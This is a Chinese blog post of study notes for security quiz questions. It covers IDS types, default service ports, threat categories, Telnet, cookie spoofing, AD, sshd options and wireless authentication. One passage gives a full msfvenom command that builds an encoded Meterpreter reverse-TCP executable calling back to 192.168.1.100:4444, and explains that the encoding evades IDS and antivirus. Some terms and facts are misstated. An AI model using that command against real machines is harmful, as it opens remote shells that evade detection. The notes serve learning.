@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>答题的时候遇到的一些奇奇怪怪的知识点吧 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>答题的时候遇到的一些奇奇怪怪的知识点吧</h1>
+    <div class="meta"><span class="chip date">2024-04-25</span><span class="chip">#渗透</span></div>
+    <article><h2>IDS（入侵检测系统）</h2>
+<h3>分类</h3>
+<h3>通过<strong>位置</strong>可以分为：</h3>
+<p>NIDS(network-based intrusion detection  system)</p>
+<p>HIDS(Host-based intrusion detection system)</p>
+<h3>通过<strong>检测</strong>的方式可以分为</h3>
+<h5>基于特征</h5>
+<ul>
+<li>模式匹配(pattern matching)</li>
+<li>状态匹配(stateful matching)</li>
+</ul>
+<h5>基于异常</h5>
+<ul>
+<li>基于统计异常</li>
+<li>基于协议异常</li>
+<li>基于流量异常</li>
+<li>规则型或启发型</li>
+</ul>
+<h6>NIDS</h6>
+<p>用于监控网络流量以检测潜在的入侵行为和安全漏洞</p>
+<p>NIDS主要分为：</p>
+<ul>
+<li>传感器：部署在网络中的硬件设备，负责捕获网络流量并传输给分析引擎。</li>
+<li>分析引擎：对捕获的数据进行解析和检测，发现异常行为或潜在的入侵行为，并生成相应的报警和日志。</li>
+<li>规则集/模式库：预定义的检测规则或模式，用于匹配和检测网络流量中的异常行为。</li>
+<li>管理界面：提供用户界面，方便管理员配置规则、查看报警和日志、管理传感器等。</li>
+</ul>
+<p>NIDS的分析引擎通常基于规则，<strong>可以通过添加自己的规则进行修改</strong></p>
+<p>参考来源:</p>
+<p><a href="https://developer.baidu.com/article/details/3212435">网络入侵检测系统（NIDS）的原理与实践-百度开发者中心 (baidu.com)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/624409778">什么是IDS（Intrusion Detection System）入侵检测系统？都有哪些类型？NIDS、HIDS、基于特征、基于异常等 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/qq_44807756/article/details/128012434">网络入侵检测 Network Intrusion Detection System (NIDS)-CSDN博客</a></p>
+<h6>HIDS</h6>
+<p>通过监视主机上的日志、文件和进程等活动来检测签字啊的入侵行为并发出警报通知管理员</p>
+<p>HIDS将备份您的配置文件，以便在恶意病毒通过更改计算机的设置而失去系统安全性时，您可以还原设置。您要防止的另一个关键因素是类Unix平台上的root用户访问权限或Windows系统上的注册表更改。 HIDS将无法阻止这些更改，但是它应该能够在发生任何此类访问时提醒您。</p>
+<h5>区分</h5>
+<p><a href="https://imgse.com/i/pkPPZjO"><img src="https://s21.ax1x.com/2024/04/25/pkPPZjO.png" alt="pkPPZjO.png"></a></p>
+<p>参考来源：</p>
+<p><a href="https://blog.csdn.net/weixin_39512626/article/details/110846155">系列一：HIDS初识-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/MEIYOUDAO_JIUSHIDAO/article/details/120905677">13款入侵检测系统介绍（HIDS）_主机入侵检测hids-CSDN博客</a></p>
+<h6>基于特征匹配</h6>
+<p>依赖网络流量或者特定特征的入侵检测技术。包括协议类型、通信模式、流量大小、请求频率等等</p>
+<p><strong>① 标志数据库 :</strong> 维护 已知攻击标志特征 数据库 ;</p>
+<p><strong>② 维护者 :</strong> 由 网络安全专家 维护上述数据库 , 由 网络管理员 操作加入特征到数据库中 ;</p>
+<p><strong>③ 弊端 :</strong> 只能检测已知攻击 , 不能检测未知攻击 ;</p>
+<p><a href="https://blog.csdn.net/shulianghan/article/details/108785482">【计算机网络】网络安全 : 入侵检测系统 ( 基于特征的入侵检测系统 | 基于异常的入侵检测系统 )-CSDN博客</a></p>
+<p>[什么是IDS（Intrusion Detection System）入侵检测系统？都有哪些类型？NIDS、HIDS、基于特征、基于异常等 - 知乎 (zhihu.com)](<a href="https://zhuanlan.zhihu.com/p/624409778#:~:text=%E5%9F%BA%E4%BA%8E%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D%E7%9A%84IDS">https://zhuanlan.zhihu.com/p/624409778#:~:text=基于特征匹配的IDS</a> 基于特征的入侵检测系统（Feature-based,IDS）是一种依赖于网络流量或系统行为中特定特征的入侵检测技术。 这些特征可以包括协议类型、通信模式、流量大小、请求频率等。 基于这些特征，入侵检测系统可以识别出潜在的恶意行为和攻击，并采取相应的措施。)</p>
+<p>基于状态匹配</p>
+<p>一种依赖于网络流量或系统行为中状态转换规律的入侵检测技术。这类IDS分析和跟踪网络通信的状态，以识别出异常或恶意行为。状态匹配方法通过分析网络连接的状态，例如TCP/IP连接的建立、维护和终止，来检测潜在的攻击。通常，这种方法使用有限状态机（FSM）或状态转移图来表示状态之间的转换。</p>
+<h5>区分：</h5>
+<p><a href="https://imgse.com/i/pkPP2b4"><img src="https://s21.ax1x.com/2024/04/25/pkPP2b4.md.png" alt="pkPP2b4.md.png"></a></p>
+<h6>基于统计异常</h6>
+<p>对网络流量和系统行为的统计特性进行建模和分析，以检测异常</p>
+<p>使用了机器学习等，可能存在较高的误报</p>
+<h6>基于协议异常</h6>
+<p>关注网络协议的异常使用，如协议格式错误、非法指令或未遵循协议规范的行为。通过检查网络流量中的协议数据包，分析是否存在不符合协议规范的情况，从而发现潜在的攻击。</p>
+<p>评价是检测专攻协议的</p>
+<h6>基于流量异常</h6>
+<p>关注网络流量的异常变化</p>
+<p>专攻流量的</p>
+<h6>规则型或启发型</h6>
+<p>依赖于预定义的规则集，通常包括已知攻击的特征和行为模式。基于规则的IDS通过匹配网络流量或系统行为与规则集，来检测潜在的攻击。规则集需要不断更新，以保持对最新攻击手段的检测能力。</p>
+<p>只能打已知的，对于0day和未知攻击的检测能力一般</p>
+<h2>weblogic</h2>
+<p>javaee架构的中间件</p>
+<p>java应用服务器，开设端口是7001（顺便说一句tomcat是8080，但经常被占用就是了）</p>
+<p>参考文章：</p>
+<p><a href="https://www.cnblogs.com/telwanggs/p/7137116.html">weblogic详解 - 疯子110 - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://segmentfault.com/a/1190000007090110">从懵逼到再入门——JavaEE完整体系架构 - 后端开发 - SegmentFault 思否</a></p>
+<h2>sql</h2>
+<p>sql serve默认用户是<strong>sa</strong>，是sa，全名应该是superadminstor</p>
+<p>顺便在一提</p>
+<p>动态脚本的编写的网站容易受到sql注入的漏洞</p>
+<h2>端口号</h2>
+<p>mysql默认端口号是<strong>3306</strong></p>
+<p>Rdids是<strong>6379</strong></p>
+<p>Zookeeper是<strong>2181</strong></p>
+<p>kafka是<strong>9092</strong></p>
+<p>etcd客户端连接端口<strong>2379</strong>，内部互联端口是<strong>2380</strong></p>
+<p>indluxdb用于客户端和服务端交互的HTTP API是<strong>8086</strong>，用于提供备份和恢复的RPC服务是<strong>8088</strong></p>
+<p>grafana是<strong>3000</strong></p>
+<p>ES节点 和 外部 通讯使用，集群间和TCPClient都走的它，http协议的RESTful接口是<strong>9200</strong>，ES节点之间通讯使用（tcp通讯端口）是<strong>9300</strong></p>
+<p>kibana是<strong>5601</strong></p>
+<p>Consul是<strong>8500</strong></p>
+<p> NSQ(消息队列)：</p>
+<ul>
+<li>nsqd : tcp :<strong>4150</strong> http :<strong>4151</strong></li>
+<li>nsqlookupd : tcp :<strong>4160</strong> http :<strong>4161</strong></li>
+<li>nsqadmin: :<strong>4171</strong></li>
+</ul>
+<p>Ntp:<strong>123</strong>
+测试ntp服务可用性：
+w32tm /stripchart /computer:ntp_server_address
+w32tm /stripchart /computer:<strong>192.168.42.133:123</strong></p>
+<p>SSH服务(安全外壳协议)是<strong>22</strong></p>
+<p>Nginx是<strong>80</strong></p>
+<h2>网络安全威胁</h2>
+<p>题目使用的是主动威胁和被动威胁，我还是第一次听说这样的称呼....</p>
+<p>实际上就是主动攻击和被动攻击</p>
+<p>被动威胁是指那些仅对信息进行非授权泄露而未改变系统状态的威胁，例如信息窃取、密码破译、信息流量分析等。被动威胁不会导致系统状态或信息的任何篡改，但有用的信息可能被盗窃并用于非法目的。主动威胁则是对系统的状态进行故意的非授权改变，例如修改数据、破坏系统功能或造成系统瘫痪等。</p>
+<p><a href="https://imgse.com/i/pkPFFl6"><img src="https://s21.ax1x.com/2024/04/25/pkPFFl6.png" alt="pkPFFl6.png"></a></p>
+<p><a href="https://imgse.com/i/pkPFVmD"><img src="https://s21.ax1x.com/2024/04/25/pkPFVmD.png" alt="pkPFVmD.png"></a></p>
+<p>参考来源：</p>
+<p><a href="https://www.zhihu.com/question/652171623">(5 封私信) 网络安全威胁的主要类型有哪些？如何有效防范？ - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/shulianghan/article/details/108620693">【计算机网络】网络安全 : 计算机网络安全威胁 ( 四种网络攻击类型 | 主动攻击与被动攻击 | 分布式拒绝服务攻击 DDos | 恶意程序 | 计算机网络安全目标)_网络安全攻击的四种形式-CSDN博客</a></p>
+<p>Metasploit</p>
+<p>msfvenom用于生成和编码payload，要对Payload进行编码，可以使用-e参数</p>
+<p>例子:</p>
+<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe</p>
+<pre><code class="language-txt">-p windows/meterpreter/reverse_tcp: 指定要生成的 payload 类型为 Meterpreter 反向 TCP shell，用于与 Metasploit 的 multi/handler 模块配合使用。
+
+LHOST=192.168.1.100: 设置 Meterpreter shell 连接的目标 IP 地址为 192.168.1.100，即攻击者监听的 IP 地址。
+
+LPORT=4444: 设置 Meterpreter shell 连接的目标端口为 4444，即攻击者监听的端口。
+
+-f exe: 指定生成的 payload 格式为可执行文件（.exe）。
+
+-e x86/shikata_ga_nai: 使用 shikata_ga_nai 编码器来对 payload 进行编码。shikata_ga_nai 是 Metasploit 提供的一种多字节编码器，用于绕过入侵检测系统 (IDS) 和防病毒软件的检测。
+
+-i 5: 设置编码器的迭代次数为 5 次。增加迭代次数可以增强编码的复杂性，提高绕过检测的能力，但也可能会增加 payload 的大小。
+
+-o payload.exe: 指定生成的 payload 输出到 payload.exe 文件中。
+</code></pre>
+<h2>Telnet:</h2>
+<p>缺省情况：系统或软件在未经过用户设置或调整时的默认状态。这个状态通常是系统或软件的初始状态，用户可以根据需要进行自定义或更改。例如，在某些应用程序中，用户可以自定义界面颜色、语言设置或权限设置，但如果用户没有进行任何更改，系统将保持在缺省状态下。</p>
+<p>Telnet是一种不安全的远程登录协议，通信过程是明文传输的不采用加密算法，所以容易受到中间人攻击导致的敏感信息泄露</p>
+<h2>Cookie欺骗</h2>
+<p>（也就是重放攻击</p>
+<p><img src="https://image.3001.net/images/20210303/1614756021_603f38b591a5d3b5eba25.png!small" alt="image"></p>
+<p>（图片来源：<a href="https://www.freebuf.com/articles/web/264969.html">实战中常见的十种cookie漏洞 - FreeBuf网络安全行业门户</a>，顺便可以看看文章，个人认为写的很清晰了</p>
+<p>cookie知识可以看<a href="https://blog.csdn.net/Y525698136/article/details/131140237">“黑客”入门学习之“Cookie技术详解”_cookie欺骗-CSDN博客</a></p>
+<h2>Windows系统</h2>
+<p>本地帐户的密钥、帐户启用状态等信息存放在注册表()下各个分支</p>
+<p><img src="https://pic.imgdb.cn/item/662a66950ea9cb14030ade4f.png" alt=""></p>
+<h3>active directory域服务</h3>
+<p><code>Microsfot</code>提供的一项功能服务，它充当集中存储库并存储与<code>Active Directory</code> 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据，它使系统管理员的管理变得容易。但它的主要功能是提供一种在域环境中对用户和机器进行身份验证的方法。使用 <code>Active Directory</code>，可以远程管理用户、工作站及其权限等资源。因此，它是一个可从网络上的任何地方访问的单一管理界面</p>
+<p>（坦白说我并不知道这是个什么东西，先埋个爪子）</p>
+<p><a href="https://zhuanlan.zhihu.com/p/528689453">AD（Active Directory）基础知识 - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/ximenjianxue/article/details/101207667">AD中组的分类区别_ad域的全局组 通用组区别-CSDN博客</a></p>
+<p>那条&quot;/etc/ssh/sshd confg&quot;配置项与使用秘钥认证登录无关</p>
+<p>A. StrictModes no</p>
+<p>B.RSAAuthentication yes</p>
+<p>C.MaxStartups 10</p>
+<p>D.PubkeyAuthentication yes</p>
+<p><strong>StrictModes 用于指定是否检查用户家目录和 .ssh 目录的权限和所有权。RSAAuthentication、MaxStartups 和 PubkeyAuthentication 都与使用密钥认证登录有关。</strong></p>
+<h2>经典nmap</h2>
+<p><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap详细使用教程_nmap使用教程-CSDN博客</a></p>
+<p>自己看得了（反正也没人看</p>
+<p>企业无线安全加密认证</p>
+<p>PEAP-MSV2（Protected Extensible Authentication Protocol with Microsoft Challenge Handshake Authentication Protocol version 2）：PEAP-MSV2 是一种基于 EAP（Extensible Authentication Protocol）的认证方法，通过在 TLS（Transport Layer Security）通道中传输 EAP 数据来确保身份验证的安全性。MS-CHAPv2（Microsoft Challenge Handshake Authentication Protocol version 2）用于在 PEAP 会话中进行身份验证。这种方法常用于企业环境中，因为它提供了一种安全的身份验证机制，可以防止中间人攻击。</p>
+<p>RC4（Rivest Cipher 4）：RC4 是一种对称加密算法，曾经被广泛用于加密无线网络的流量。然而，由于其存在严重的安全漏洞，包括被称为“密钥恢复攻击”的问题，RC4 已经被废弃，不再被认为是安全的加密算法。</p>
+<p>RSA（Rivest-Shamir-Adleman）：RSA 是一种非对称加密算法，通常用于数字签名和密钥交换。在企业无线安全中，RSA 主要用于建立安全通信通道和进行身份验证。</p>
+<p>WPA-PSK（Wi-Fi Protected Access Pre-Shared Key）：WPA-PSK 是一种基于预共享密钥的无线网络加密认证方法。在这种方法中，所有连接到同一网络的设备使用相同的预共享密钥进行加密和解密。尽管相对于其他方法（如 WPA-Enterprise）来说安全性稍低，但 WPA-PSK 仍然是一种简单而有效的企业无线安全加密认证方法，适用于小型企业或家庭网络。</p>
+<p>先写到这吧，挺多内容的懒得写了，接着埋爪子.....</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
